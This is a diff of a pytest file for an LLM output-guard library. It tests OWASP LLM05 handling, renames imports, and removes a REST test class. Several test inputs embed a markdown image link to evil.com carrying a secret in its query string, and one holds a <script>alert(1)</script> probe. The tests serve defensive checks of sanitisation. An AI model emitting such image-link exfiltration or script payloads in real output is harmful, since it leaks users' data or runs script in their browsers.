@@ -1,12 +1,10 @@
 """Improper output handling tests (OWASP LLM05)."""
 import pytest
 import yaml
-from fastapi.testclient import TestClient
 
-from app.config import settings
-from app.main import app
-from app.pipeline.output_handling import OutputHandlingPolicy, handle_output
-from app.pipeline.policy import PolicyEngine
+from sentinel.config import settings
+from sentinel.pipeline.output_handling import OutputHandlingPolicy, handle_output
+from sentinel.pipeline.policy import PolicyEngine
 from sentinel import Guard, OutputBlocked
 
 DEFAULT = OutputHandlingPolicy()  # images strip, links allow, html sanitize
@@ -199,17 +197,3 @@ class TestSdk:
         # A secret hidden inside a stripped image URL must not reach the user
         out = Guard().check_output("ok ![x](https://evil.com/?k=abc)")
         assert "abc" not in out.sanitized_output
-
-
-class TestRest:
-    def test_image_stripped(self):
-        with TestClient(app) as c:
-            r = c.post("/v1/output/analyze", json={"output": "hi ![x](https://evil.com/?d=1)"})
-            body = r.json()
-            assert "evil.com" not in body["sanitized_output"]
-            assert body["pipeline"]["output_handling"]["actions"] == ["strip_image"]
-
-    def test_script_sanitized(self):
-        with TestClient(app) as c:
-            r = c.post("/v1/output/analyze", json={"output": "x <script>alert(1)</script>"})
-            assert "script" not in r.json()["sanitized_output"]
